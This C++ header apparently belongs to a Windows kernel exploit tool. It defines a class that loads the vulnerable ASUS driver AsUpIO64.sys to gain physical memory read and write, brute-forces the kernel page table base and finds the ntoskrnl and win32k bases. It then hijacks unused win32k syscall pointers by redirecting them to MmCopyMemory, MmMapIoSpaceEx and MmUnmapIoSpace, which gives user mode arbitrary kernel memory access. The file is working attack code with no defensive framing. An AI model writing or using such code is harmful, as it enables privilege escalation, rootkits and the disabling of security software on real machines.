#pragma once
#include "Driver.h"
#include "structs.h"
#include <psapi.h>
#include "Syscall.h"


inline NtCall PointerOne("NtUserDrawCaptionTemp",0x65E28); // This needs to be specifically a function that gets sys called with the same or more parameters as mmcopymemory 
inline NtCall PointerTwo("NtUserSetPrecisionTouchPadConfiguration",0x66AD0); // these can be any unused nt function in win32k
inline NtCall PointerThree("NtUserGetPrecisionTouchPadConfiguration",0x67500); // these can be any unused nt function in win32k
class Kernel {
public:
    Kernel() : Asus("C:\\Windows\\System32\\drivers\\AsUpIO64.sys", "ASUS") { }
    bool Initialize(bool Load) {
        if (!Load) {
            Exploit = Syscall(PointerOne, PointerTwo, PointerThree);
            bIsExploitInit = true;
        }
        else {
            if (Asus.StartDriver()) return false;
            bDriverLoaded = true;
        }
        DirTableBase = BruteKernelDirectoryTable();
        if (!DirTableBase) return false;
        printf("[+] Kernel Dir Table: %llx\n", DirTableBase);
        ntoskrnlVirtual = (__int64)GetKernelAddress("ntoskrnl.exe");
        ntoskrnlPhysical = TranslateLinearAddress(DirTableBase, ntoskrnlVirtual);
        printf("[+] ntoskrnl: (virtual) %llx\n", ntoskrnlVirtual);
        printf("[+] ntoskrnl: (physical) %llx\n", ntoskrnlPhysical);
        __int64 ExplorerProcess = EProcess("explorer.exe", 1);
        printf("[+] Explorer Process: (virtual) %llx\n", ExplorerProcess);
        ExplorerDirectoryTable = GetProcessDirectoryTable(ExplorerProcess);
        printf("[+] Explorer Directory Table: %llx\n", ExplorerDirectoryTable);
        win32kVirtual = (__int64)GetKernelAddress("win32k.sys");
        printf("[+] win32k Base: (virtual) %llx\n", win32kVirtual);
        if (Load) {
            SwapPointer("MmCopyMemory", PointerOne.DataPtr);
            SwapPointer("MmMapIoSpaceEx", PointerTwo.DataPtr);
            SwapPointer("MmUnmapIoSpace", PointerThree.DataPtr);
            Exploit = Syscall(PointerOne, PointerTwo, PointerThree);
            bIsExploitInit = true;
        }
        return true;
    }
    void Cleanup() {
        if(bDriverLoaded)
        Asus.StopDriver();
    }

    bool ReadPhysical(__int64 PhysicalAddr, void* Buffer, int size) {
        if (!bIsExploitInit)
            return Asus.ReadPhysical(PhysicalAddr, Buffer, size);
        else
            return Exploit.ReadPhysical(PhysicalAddr, Buffer, size);
    }
    bool WritePhysical(__int64 PhysicalAddr, void* Buffer, int size) {
        if (!bIsExploitInit)
            return Asus.WritePhysical(PhysicalAddr, Buffer, size);
        else
            return Exploit.WritePhysical(PhysicalAddr, Buffer, size);
    }
    template<class T>
    T Read(__int64 PhysicalAddr) {
        T Ret;
        ReadPhysical(PhysicalAddr, &Ret, sizeof(Ret));
        return Ret;
    }
    template<class T>
    void Write(__int64 PhysicalAddr, T Buffer) {
        WritePhysical(PhysicalAddr, &Buffer, sizeof(Buffer));
    }

    int ProcessId(const char* Name, int Index);
    __int64 EProcess(const char* Name, int Index);
    __int64 EProcess(int TragetProcessId);
    __int64 EThread(__int64 DirectoryTable, __int64 EProcess, int TargetThreadId);
    __int64 TranslateLinearAddress(__int64 directoryTableBase, __int64 virtualAddress);
    __int64 GetProcessDirectoryTable(__int64 EProcess);
private:
    bool bIsExploitInit;
    bool bDriverLoaded;
    __int64 DirTableBase;
    __int64 ExplorerDirectoryTable;
    __int64 ntoskrnlVirtual;
    __int64 ntoskrnlPhysical;
    __int64 win32kVirtual;
    __int64 ExportOffset(__int64 BaseAddress, const char* FunctionName);
    __int64 KernelExport(const char* FunctionName);
    __int64 BruteKernelDirectoryTable(); // Bruting Forcing Kernel Directory Table Base
    void* GetKernelAddress(const char* Name);
    void SwapPointer(const char* FunctionName, __int64 Offset);
    Driver Asus;
    Syscall Exploit;
};

